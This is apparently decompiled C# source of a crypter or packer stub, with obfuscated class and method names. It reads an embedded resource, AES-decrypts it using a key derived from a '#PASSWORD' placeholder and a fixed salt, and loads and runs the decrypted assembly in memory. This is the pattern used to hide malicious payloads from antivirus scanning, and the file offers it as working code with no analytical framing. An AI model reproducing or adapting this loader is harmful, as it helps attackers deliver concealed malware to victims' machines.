using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace ns0
{
	// Token: 0x02000002 RID: 2
	internal static class Class_1
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002068 File Offset: 0x00000268
		private static void Method_0()
		{
			using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(""))
			{
				byte[] array = new byte[manifestResourceStream.Length];
				manifestResourceStream.Read(array, 0, array.Length);
				array = Class_1.Method_1(array, "#PASSWORD");
				Assembly.Load(array).EntryPoint.Invoke(null, null);
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020E0 File Offset: 0x000002E0
		private static byte[] Method_1(byte[] byte_0, string string_0)
		{
			byte[] result;
			using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
			{
				using (SHA256CryptoServiceProvider sha256CryptoServiceProvider = new SHA256CryptoServiceProvider())
				{
					byte[] password = sha256CryptoServiceProvider.ComputeHash(Encoding.BigEndianUnicode.GetBytes(string_0));
					byte[] salt = new byte[] { 170, byte.MaxValue, 187, 207, 204, 221, 223, 175 };
					using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt, 1000))
					{
						aesCryptoServiceProvider.KeySize = 256;
						aesCryptoServiceProvider.BlockSize = 128;
						aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.KeySize / 8);
						aesCryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.BlockSize / 8);
						aesCryptoServiceProvider.Mode = CipherMode.ECB;
						aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
						result = aesCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(byte_0, 0, byte_0.Length);
					}
				}
			}
			return result;
		}
	}
}
